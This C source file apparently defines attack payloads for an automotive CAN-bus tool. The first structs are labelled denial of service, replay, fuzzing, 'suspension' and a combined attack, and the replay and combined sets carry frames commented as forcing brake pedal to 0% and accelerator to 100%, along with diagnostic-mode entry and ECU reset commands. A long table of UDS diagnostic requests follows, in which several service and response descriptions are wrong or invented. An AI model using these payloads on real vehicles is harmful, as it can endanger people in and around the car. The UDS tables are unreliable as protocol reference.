// payloads.c

#include "payloads.h"

/*================================================================
payloads.c
This file defines and initializes payload structures.
=================================================================*/

// Definition of 'dos'
struct payloads dos = {
    .payload1 = {0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78},
    .payload1_len = 8,
    .payload2_len = 0,
    .payload3_len = 0,
    .payload4_len = 0,
    .payload5_len = 0,
};

// Definition of 'replay'
struct payloads replay = {
    .payload1 = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12},   // tx payload break pedal 0%
    .payload2 = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12},   // tx payload accel pedal 100%
    .payload1_len = 8,
    .payload2_len = 8,
    .payload3_len = 0,
    .payload4_len = 0,
    .payload5_len = 0,
};

// Definition of 'fuzzing'
struct payloads fuzzing = {
    .payload1 = {0x02, 0x3E, 0x00},                                 // tx payload to make reply
    .payload2 = {0x02, 0x7E, 0x00},                                 // rx payload to check ECU live
    .payload3 = {0x00, 0x00, 0xD2, 0x11, 0x73, 0x58, 0xFA, 0xF8}, // fuzzing_random_canid payload
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 8,
    .payload4_len = 0,
    .payload5_len = 0,
};

// Definition of 'suspension'
struct payloads suspension = {
    .payload1 = {0x02, 0x10, 0x02}, // tx payload to enter diag mode
    .payload2 = {0x02, 0x11, 0x01}, // tx payload to make ECU reset
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 0,
    .payload4_len = 0,
    .payload5_len = 0,
};

// Definition of 'msq'
struct payloads msq = {
    .payload1 = {0x02, 0x10, 0x02},                                  // tx payload to enter diag mode
    .payload2 = {0x02, 0x11, 0x01},                                  // tx payload to make ECU reset
    .payload3 = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12},    // tx payload break pedal 0%
    .payload4 = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12},    // tx payload accel pedal 100%
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 8,
    .payload4_len = 8,
    .payload5_len = 0, // Placeholder
};

// Definition of 'uds_reply'
struct answer uds_reply = {
    .answer10 = "General Reject",
    .answer11 = "Service not supported",
    .answer12 = "Sub-Function not supported",
    .answer13 = "Incorrect message length or invalid format",
    .answer21 = "Incorrect Message Length or Invalid Format",
    .answer22 = "Conditions Not Correct",
    .answer24 = "Request Sequence Error",
    .answer31 = "Routine Not Complete",
    .answer33 = "Security access denied",
    .answer50 = "Invalid Response Parameter Format",
    .answer51 = "Request Out of Range",
    .answer67 = "Request Correctly Received - Response Pending",
    .answerC5 = "Unknown Negative Response",
    .answer7E = "Service Not Supported in Active Session"
};

// Definition of 'struct uds_request' variables

// Service 0x10 (DIAGNOSTIC SESSION CONTROL)
struct uds_request diagnostic_session_control = {
    .payload1 = {0x02, 0x10, 0x01},
    .payload2 = {0x02, 0x10, 0x02},
    .payload3 = {0x02, 0x10, 0x03},
    .payload4 = {0x02, 0x10, 0x04},
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 3,
    .payload4_len = 3,
    .payload5_len = 0,
    .service1 = "Default Session",
    .service2 = "Programming Session",
    .service3 = "Extended Session",
    .service4 = "Safety Session Diagnostic Session",
    .service5 = "Reserved"
};

// Service 0x11 (ECU RESET)
struct uds_request ECU_reset = {
    .payload1 = {0x02, 0x11, 0x01}, // Sub-Function 0x01: Hard Reset
    .payload2 = {0x02, 0x11, 0x02}, // Sub-Function 0x02: Soft Reset
    .payload3 = {0x02, 0x11, 0x03}, // Sub-Function 0x03: Custom Reset Option 1
    .payload4 = {0x02, 0x11, 0x04}, // Sub-Function 0x04: Custom Reset Option 2
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 3,
    .payload4_len = 3,
    .payload5_len = 0,
    .service1 = "Hard Reset",
    .service2 = "Soft Reset",
    .service3 = "Custom Reset Option 1",
    .service4 = "Custom Reset Option 2",
    .service5 = "Reserved"
};

// Service 0x14 (CLEAR DIAGNOSTIC INFORMATION)
struct uds_request clear_diagnostic_information = {
    .payload1 = {0x02, 0x14, 0x01}, // Clear All DTCs
    .payload2 = {0x02, 0x14, 0x02}, // Clear DTCs by Identifier
    .payload3 = {0x02, 0x14, 0x03}, // Clear Memory Stored DTCs
    .payload4 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 3,
    .payload4_len = 0,
    .payload5_len = 0,
    .service1 = "Clear All DTCs",
    .service2 = "Clear DTCs by Identifier",
    .service3 = "Clear Memory Stored DTCs",
    .service4 = "Reserved",
    .service5 = "Reserved"
};

// Service 0x19 (READ DTC INFORMATION)
struct uds_request read_dtc_information = {
    .payload1 = {0x02, 0x19, 0x01}, // Report DTC by Status Mask
    .payload2 = {0x02, 0x19, 0x02}, // Report DTC by Occurrence Counter
    .payload3 = {0x02, 0x19, 0x03}, // Report DTC Snapshot Record
    .payload4 = {0x02, 0x19, 0x04}, // Report Supported DTCs
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 3,
    .payload4_len = 3,
    .payload5_len = 0,
    .service1 = "Report DTC by Status Mask",
    .service2 = "Report DTC by Occurrence Counter",
    .service3 = "Report DTC Snapshot Record",
    .service4 = "Report Supported DTCs",
    .service5 = "Reserved"
};

// Service 0x22 (READ DATA BY IDENTIFIER)
struct uds_request read_data_by_identifier = {
    .payload1 = {0x03, 0x22, 0xF1, 0x90}, // Example Identifier 0xF190: VIN Number
    .payload2 = {0x03, 0x22, 0xF1, 0x92}, // Example Identifier 0xF192: Calibration ID
    .payload3 = {0x03, 0x22, 0xF1, 0x93}, // Example Identifier 0xF193: Calibration Verification Numbers
    .payload4 = {0x03, 0x22, 0xF1, 0x94}, // Example Identifier 0xF194: Calibration Software Number
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 4,
    .payload2_len = 4,
    .payload3_len = 4,
    .payload4_len = 4,
    .payload5_len = 0,
    .service1 = "Read VIN Number",
    .service2 = "Read Calibration ID",
    .service3 = "Read Calibration Verification Numbers",
    .service4 = "Read Calibration Software Number",
    .service5 = "Reserved"
};

// Service 0x23 (READ MEMORY BY ADDRESS)
struct uds_request read_memory_by_address = {
    .payload1 = {0x05, 0x23, 0xFF, 0xFF, 0x00, 0x10}, // Read from Address 0xFFFF0010, Length 16 bytes
    .payload2 = {0x05, 0x23, 0xFF, 0xFF, 0x00, 0x20}, // Read from Address 0xFFFF0020, Length 32 bytes
    .payload3 = {0x05, 0x23, 0xFF, 0xFF, 0x00, 0x30}, // Read from Address 0xFFFF0030, Length 48 bytes
    .payload4 = {0x05, 0x23, 0xFF, 0xFF, 0x00, 0x40}, // Read from Address 0xFFFF0040, Length 64 bytes
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 6,
    .payload2_len = 6,
    .payload3_len = 6,
    .payload4_len = 6,
    .payload5_len = 0,
    .service1 = "Read Memory Address 0xFFFF0010, Length 16 bytes",
    .service2 = "Read Memory Address 0xFFFF0020, Length 32 bytes",
    .service3 = "Read Memory Address 0xFFFF0030, Length 48 bytes",
    .service4 = "Read Memory Address 0xFFFF0040, Length 64 bytes",
    .service5 = "Reserved"
};

// Service 0x27 (SECURITY ACCESS)
struct uds_request security_access = {
    .payload1 = {0x02, 0x27, 0x01}, // Request Seed
    .payload2 = {0x02, 0x27, 0x02}, // Send Key
    .payload3 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload4 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 8,
    .payload4_len = 8,
    .payload5_len = 8,
    .service1 = "Request Seed",
    .service2 = "Send Key",
    .service3 = "Reserved",
    .service4 = "Reserved",
    .service5 = "Reserved"
};

// Service 0x2E (WRITE DATA BY IDENTIFIER)
struct uds_request write_data_by_identifier = {
    .payload1 = {0x07, 0x2E, 0xF1, 0x90, 0x00, 0x01, 0x02, 0x03}, // Write VIN Number, Data
    .payload2 = {0x07, 0x2E, 0xF1, 0x92, 0x04, 0x05, 0x06, 0x07}, // Write Calibration ID, Data
    .payload3 = {0x07, 0x2E, 0xF1, 0x93, 0x08, 0x09, 0x0A, 0x0B}, // Write Calibration Verification Numbers, Data
    .payload4 = {0x07, 0x2E, 0xF1, 0x94, 0x0C, 0x0D, 0x0E, 0x0F}, // Write Calibration Software Number, Data
    .payload5 = {0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 8,
    .payload2_len = 8,
    .payload3_len = 8,
    .payload4_len = 8,
    .payload5_len = 0,
    .service1 = "Write VIN Number",
    .service2 = "Write Calibration ID",
    .service3 = "Write Calibration Verification Numbers",
    .service4 = "Write Calibration Software Number",
    .service5 = "Reserved"
};

// Service 0x31 (ROUTINE CONTROL)
struct uds_request routine_control = {
    .payload1 = {0x02, 0x31, 0x01}, // Start Routine, Routine ID 0x0000
    .payload2 = {0x02, 0x31, 0x02}, // Stop Routine, Routine ID 0x0000
    .payload3 = {0x02, 0x31, 0x03}, // Request Routine Results, Routine ID 0x0000
    .payload4 = {0x00, 0x00, 0x00}, // Placeholder
    .payload5 = {0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 3,
    .payload4_len = 3,
    .payload5_len = 3,
    .service1 = "Start Routine",
    .service2 = "Stop Routine",
    .service3 = "Request Routine Results",
    .service4 = "Reserved",
    .service5 = "Reserved"
};

// Service 0x34 (REQUEST DOWNLOAD)
struct uds_request request_download = {
    .payload1 = {0x07, 0x34, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00}, // Request Download, Addressing Format 1
    .payload2 = {0x07, 0x34, 0x02, 0x10, 0x00, 0x00, 0x00, 0x00}, // Request Download, Addressing Format 2
    .payload3 = {0x07, 0x34, 0x03, 0x20, 0x00, 0x00, 0x00, 0x00}, // Request Download, Addressing Format 3
    .payload4 = {0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload5 = {0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 8,
    .payload2_len = 8,
    .payload3_len = 8,
    .payload4_len = 8,
    .payload5_len = 0,
    .service1 = "Request Download - Addressing Format 1",
    .service2 = "Request Download - Addressing Format 2",
    .service3 = "Request Download - Addressing Format 3",
    .service4 = "Reserved",
    .service5 = "Reserved"
};

// Service 0x35 (REQUEST UPLOAD)
struct uds_request request_upload = {
    .payload1 = {0x07, 0x35, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00}, // Request Upload, Addressing Format 1
    .payload2 = {0x07, 0x35, 0x02, 0x10, 0x00, 0x00, 0x00, 0x00}, // Request Upload, Addressing Format 2
    .payload3 = {0x07, 0x35, 0x03, 0x20, 0x00, 0x00, 0x00, 0x00}, // Request Upload, Addressing Format 3
    .payload4 = {0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload5 = {0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 8,
    .payload2_len = 8,
    .payload3_len = 8,
    .payload4_len = 8,
    .payload5_len = 0,
    .service1 = "Request Upload - Addressing Format 1",
    .service2 = "Request Upload - Addressing Format 2",
    .service3 = "Request Upload - Addressing Format 3",
    .service4 = "Reserved",
    .service5 = "Reserved"
};

// Service 0x36 (TRANSFER DATA)
struct uds_request transfer_data = {
    .payload1 = {0x07, 0x36, 0x01, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE}, // Transfer Data - Data Block 1
    .payload2 = {0x07, 0x36, 0x02, 0x11, 0x22, 0x33, 0x44, 0x55}, // Transfer Data - Data Block 2
    .payload3 = {0x07, 0x36, 0x03, 0x66, 0x77, 0x88, 0x99, 0x00}, // Transfer Data - Data Block 3
    .payload4 = {0x07, 0x36, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload5 = {0x07, 0x36, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 8,
    .payload2_len = 8,
    .payload3_len = 8,
    .payload4_len = 8,
    .payload5_len = 0,
    .service1 = "Transfer Data - Data Block 1",
    .service2 = "Transfer Data - Data Block 2",
    .service3 = "Transfer Data - Data Block 3",
    .service4 = "Reserved",
    .service5 = "Reserved"
};

// Service 0x37 (REQUEST TRANSFER EXIT)
struct uds_request request_transfer_exit = {
    .payload1 = {0x02, 0x37, 0x01}, // Request Transfer Exit - Cancel Transfer
    .payload2 = {0x02, 0x37, 0x02}, // Request Transfer Exit - Complete Transfer
    .payload3 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload4 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 8,
    .payload4_len = 8,
    .payload5_len = 8,
    .service1 = "Request Transfer Exit - Cancel Transfer",
    .service2 = "Request Transfer Exit - Complete Transfer",
    .service3 = "Reserved",
    .service4 = "Reserved",
    .service5 = "Reserved"
};

// Service 0x3D (WRITE MEMORY BY ADDRESS)
struct uds_request write_memory_by_address_3D = {
    .payload1 = {0x07, 0x3D, 0x01, 0xFF, 0xFF, 0x00, 0x10, 0x00}, // Write Memory - Address 0xFFFF0010, Length 16 bytes
    .payload2 = {0x07, 0x3D, 0x02, 0xFF, 0xFF, 0x00, 0x20, 0x00}, // Write Memory - Address 0xFFFF0020, Length 32 bytes
    .payload3 = {0x07, 0x3D, 0x03, 0xFF, 0xFF, 0x00, 0x30, 0x00}, // Write Memory - Address 0xFFFF0030, Length 48 bytes
    .payload4 = {0x07, 0x3D, 0x04, 0xFF, 0xFF, 0x00, 0x40, 0x00}, // Write Memory - Address 0xFFFF0040, Length 64 bytes
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 8,
    .payload2_len = 8,
    .payload3_len = 8,
    .payload4_len = 8,
    .payload5_len = 0,
    .service1 = "Write Memory - Address 0xFFFF0010, Length 16 bytes",
    .service2 = "Write Memory - Address 0xFFFF0020, Length 32 bytes",
    .service3 = "Write Memory - Address 0xFFFF0030, Length 48 bytes",
    .service4 = "Write Memory - Address 0xFFFF0040, Length 64 bytes",
    .service5 = "Reserved"
};

// Service 0x3E (TESTER PRESENT)
struct uds_request tester_present = {
    .payload1 = {0x02, 0x3E, 0x01}, // Tester Present - Request Idle State
    .payload2 = {0x02, 0x3E, 0x02}, // Tester Present - Request Sleep State
    .payload3 = {0x02, 0x3E, 0x03}, // Tester Present - Request Active State
    .payload4 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload5 = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Placeholder
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 3,
    .payload4_len = 8,
    .payload5_len = 8,
    .service1 = "Tester Present - Request Idle State",
    .service2 = "Tester Present - Request Sleep State",
    .service3 = "Tester Present - Request Active State",
    .service4 = "Reserved",
    .service5 = "Reserved"
};

// Service 0x85 (CONTROL DTC SETTINGS)
struct uds_request control_dtc_settings = {
    .payload1 = {0x02, 0x85, 0x01},
    .payload2 = {0x02, 0x85, 0x02},
    .payload3 = {0x02, 0x85, 0x03},
    .payload4 = {0x02, 0x85, 0x04},
    .payload5 = {0x02, 0x85, 0x05},
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 3,
    .payload4_len = 3,
    .payload5_len = 3,
    .service1 = "Enable DTC Clearing",
    .service2 = "Disable DTC Clearing",
    .service3 = "Enable Specific DTC",
    .service4 = "Disable Specific DTC",
    .service5 = "Reset DTC Settings"
};

// Service 0x87 (LINK CONTROL)
struct uds_request link_control = {
    .payload1 = {0x02, 0x87, 0x01},
    .payload2 = {0x02, 0x87, 0x02},
    .payload3 = {0x02, 0x87, 0x03},
    .payload4 = {0x02, 0x87, 0x04},
    .payload5 = {0x02, 0x87, 0x05},
    .payload1_len = 3,
    .payload2_len = 3,
    .payload3_len = 3,
    .payload4_len = 3,
    .payload5_len = 3,
    .service1 = "Open Link",
    .service2 = "Close Link",
    .service3 = "Link Status Request",
    .service4 = "Reset Link",
    .service5 = "Configure Link Parameters"
};